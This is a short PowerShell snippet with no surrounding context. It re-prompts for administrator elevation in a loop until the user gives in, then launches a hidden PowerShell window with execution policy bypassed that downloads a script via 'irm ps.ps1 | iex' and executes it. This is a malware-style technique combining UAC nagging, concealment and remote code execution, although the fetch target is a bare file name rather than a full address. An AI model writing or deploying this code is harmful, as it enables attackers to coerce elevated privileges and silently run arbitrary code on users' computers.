do {
    try {
        Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm ps.ps1 | iex"' -Verb RunAs
        $success = $true
    } catch {
        $success = $false
    }
} until ($success)
